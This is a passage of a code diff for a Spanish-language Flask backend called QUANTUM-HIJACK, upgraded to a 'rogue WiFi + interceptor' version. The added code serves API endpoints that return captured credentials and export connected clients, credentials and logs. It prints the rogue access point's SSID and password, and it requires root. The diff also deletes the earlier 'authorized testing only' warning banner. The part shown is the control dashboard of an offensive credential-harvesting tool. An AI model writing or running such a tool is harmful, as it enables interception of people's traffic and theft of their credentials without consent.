+
+@app.route('/api/credentials', methods=['GET'])
+def api_credentials():
+    """Obtener credenciales capturadas"""
+    state['credentials_captured'] = read_credentials()
+    return jsonify({'credentials': state['credentials_captured']})
 
 @app.route('/api/logs', methods=['GET'])
 def api_logs():
-    """API: Obtener logs de operaciones"""
-    try:
-        if os.path.exists(LOGS_DB):
-            with open(LOGS_DB, 'r') as f:
-                logs = json.load(f)
-            return jsonify({
-                "total": len(logs),
-                "logs": logs[-50:]  # Últimos 50 logs
-            })
-        return jsonify({
-            "total": 0,
-            "logs": []
-        })
-    except Exception as e:
-        return jsonify({"success": False, "error": str(e)}), 400
+    """Obtener logs de operación"""
+    limit = request.args.get('limit', 100, type=int)
+    return jsonify({'logs': state['operations_log'][-limit:]})
 
 @app.route('/api/export', methods=['GET'])
 def api_export():
-    """API: Exportar datos completos"""
+    """Exportar datos completos"""
+    export_data = {
+        'timestamp': datetime.now().isoformat(),
+        'state': state,
+        'clients': get_connected_clients(),
+        'credentials': read_credentials(),
+        'logs': state['operations_log']
+    }
+    
+    filename = f"export_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
+    
     try:
-        return jsonify({
-            "timestamp": datetime.now().isoformat(),
-            "infected_devices": INFECTED_DEVICES,
-            "current_attacks": ATTACKS,
-            "stats": STATS
-        })
-    except Exception as e:
-        return jsonify({"success": False, "error": str(e)}), 400
+        with open(filename, 'w') as f:
+            json.dump(export_data, f, indent=2)
+        log_operation(f"Datos exportados a {filename}", "SUCCESS")
+    except:
+        pass
+    
+    return jsonify(export_data)
 
-# ========================
-# Rutas anteriores (mantenidas)
-# ========================
+# ═══════════════════════════════════════════════════════════════════════════
+# MAIN
+# ═══════════════════════════════════════════════════════════════════════════
 
 def main():
-    """Función principal"""
-    print("""
-    ╔════════════════════════════════════════╗
-    ║     QUANTUM-HIJACK 2026 v1.0           ║
-    ║     Hacking Ético - Emmanuel           ║
-    ║                                        ║
-    ║  ⚠️  SOLO para testing autorizado      ║
-    ║  ⚠️  No usar sin permiso                ║
-    ╚════════════════════════════════════════╝
-    """)
+    """Inicializar app"""
+    ensure_dirs()
     
-    # Verificar permisos
-    if not hijack.check_root():
-        sys.exit(1)
+    print("\n" + "="*70)
+    print("║" + " "*68 + "║")
+    print("║" + "  🔓 QUANTUM-HIJACK v2.0 - ROGUE WIFI + INTERCEPTOR  ".center(68) + "║")
+    print("║" + "  Control centralizado del concepto completo  ".center(68) + "║")
+    print("║" + " "*68 + "║")
+    print("="*70)
+    print("")
     
-    # Detectar y configurar interfaz wireless en modo monitor
-    print("\n[INICIALIZACIÓN]")
-    print("─" * 50)
+    log_operation("Iniciando QUANTUM-HIJACK Backend...")
     
-    interfaces = hijack.get_wireless_interfaces()
-    if interfaces:
-        print(f"\n💡 Se detectaron {len(interfaces)} interfaz(es) wireless:")
-        for idx, iface in enumerate(interfaces, 1):
-            print(f"   {idx}. {iface}")
-        
-        print("\n🔧 Configurando modo monitor automáticamente...")
-        if hijack.set_monitor_mode():
-            print(f"✅ Interfaz {hijack.monitor_interface} lista en modo monitor")
-        else:
-            print("⚠️  Advertencia: No se pudo activar modo monitor")
-            print("   El programa continuará con funcionalidad limitada")
-    else:
-        print("⚠️  No se detectaron interfaces wireless")
-        print("   El programa funcionará solo con interfaces de red estándar")
+    # Verificar permisos root
+    if os.geteuid() != 0:
+        log_operation("⚠️  Este script requiere permisos root (sudo)", "WARNING")
     
-    hijack.running = True
-    local_ip = hijack.get_local_ip()
+    # Detectar interfaz
+    detect_wifi_interface()
     
-    print(f"""
-    ─────────────────────────────────────────────────
-    [DASHBOARD ACTIVO]
+    print("\n" + "="*70)
+    print("📡 CONFIGURACIÓN")
+    print("="*70)
+    print(f"  WiFi Interface: {state['wifi_interface']}")
+    print(f"  Monitor Mode: {state['monitor_interface']}")
+    print(f"  SSID: {state['ssid']}")
+    print(f"  Password: {state['password']}")
+    print(f"  Gateway: {state['gateway_ip']}")
+    print("")
     
-    🌐 DASHBOARD WEB:  http://{local_ip}:8080
-    🌐 URL Externa:    http://0.0.0.0:8080
-    📡 Interfaz Monitor: {hijack.monitor_interface or 'No configurada'}
+    print("🌐 WEB DASHBOARD")
+    print("="*70)
+    print(f"  → http://localhost:8080")
+    print("")
     
-    [NUEVOS ENDPOINTS DASHBOARD]
-    
-    GET  /              - Dashboard HTML profesional
-    GET  /api/infected  - Dispositivos infectados
-    POST /api/infected/add - Agregar infectado
-    DELETE /api/infected/remove/<ip> - Remover infectado
-    DELETE /api/infected/clear - Limpiar historial
-    GET  /api/logs      - Logs de operaciones
-    GET  /api/export    - Exportar datos
-    
-    [API ENDPOINTS CLÁSICOS]
-    
-    GET  /api/status         - Estado del sistema
-    POST /api/scan           - Escanear red local
-    POST /api/attacks/start  - Iniciar ataque
-    POST /api/attacks/stop   - Detener ataque
-    GET  /api/stats          - Ver estadísticas
-    GET  /api/devices        - Dispositivos detectados
-    GET  /api/monitor        - Info modo monitor
-    
-    ─────────────────────────────────────────────────
-    Presiona CTRL+C para detener y limpiar
-    ─────────────────────────────────────────────────
-    """)
-    
+    # Iniciar Flask
     try:
-        app.run(host='0.0.0.0', port=8080, debug=False, use_reloader=False)
+        app.run(host='0.0.0.0', port=8080, debug=False, threaded=True)
     except KeyboardInterrupt:
-        print("\n\n⛔ DETENIENDO APLICACIÓN...")
-        print("─" * 50)
-        
-        # Guardar datos antes de salir
-        save_infected_devices(INFECTED_DEVICES)
-        add_log('APP_SHUTDOWN', 'Aplicación cerrada normalmente')
-        
-        # Restaurar interfaz a modo managed
-        if hijack.monitor_interface:
-            print("🔄 Restaurando interfaz a modo normal...")
-            hijack.restore_managed_mode()
-        
-        hijack.running = False
-        print("✅ Datos guardados. Limpieza completada. ¡Hasta pronto!")
-        print("─" * 50 + "\n")
+        log_operation("Servidor interrumpido", "INFO")
+        api_stop_all()
         sys.exit(0)
-    except Exception as e:
-        logger.error(f"Error fatal: {e}")
-        
-        # Intentar restaurar de todos modos
-        if hijack.monitor_interface:
-            hijack.restore_managed_mode()
-        
-        sys.exit(1)
 
 if __name__ == '__main__':
-    main()
+    if os.geteuid() == 0:  # Solo si es root
+        main()
+    else:
+        print("❌ Este script requiere permisos root")
+        print("Ejecuta: sudo python3 quantum_hijack_full.py")
+        sys.exit(1)
